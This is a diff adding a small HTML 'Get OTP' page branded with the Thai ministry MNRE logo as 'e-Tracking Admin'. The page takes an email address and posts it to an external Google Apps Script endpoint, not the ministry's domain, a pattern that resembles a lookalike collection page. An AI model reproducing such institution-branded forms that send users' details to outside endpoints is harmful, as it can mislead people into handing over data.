@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<title>MNRE | Get OTP</title>
+
+<head>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="css/otp.css">
+</head>
+
+<body onload="document.getElementById('id01').style.display='block'">
+
+<div id="id01" class="modal">
+   
+    <form class="modal-content animate" action="https://script.google.com/macros/s/AKfycbwFqUbn1R3QK6wSXBlqet8DSHHkkA79mrWdr-5-MhBtG0XFnFIk5iNsagBx5pgDM7B3/exec" method="post">
+
+    <div class="imgcontainer">
+      <span onclick="window.open('https://esc.mnre.go.th/app/e-tracking/update.php');" class="close" title="Close Modal">&times;</span>
+         
+      <img src="https://esc.mnre.go.th/img/mnre.png" style="width:80px;"><br>e-Tracking Admin
+    </div>
+
+    <div class="container">
+      <label for="uname"><b>Email</b></label>
+      <input type="text"   placeholder="Enter Email" id="email" name="email" required>
+          
+      <button type="submit">Get OTP</button>
+             </div>
+    <div class="container" style="background-color:#f1f1f1;font-size:12px;">
+     &copy; 2025 MNRE Service Link Center
+  
+
+
+    </div>
+  </form>
+</div>
+
+<script>
+// Get the modal
+var modal = document.getElementById('id01');
+
+/*/
+// When the user clicks anywhere outside of the modal, close it
+window.onclick = function(event) {
+    if (event.target == modal) {
+        window.open("https://esc.mnre.go.th/app/e-tracking/update.php");
+    }
+}
+*/
+</script>
+
+</body>
+</html>
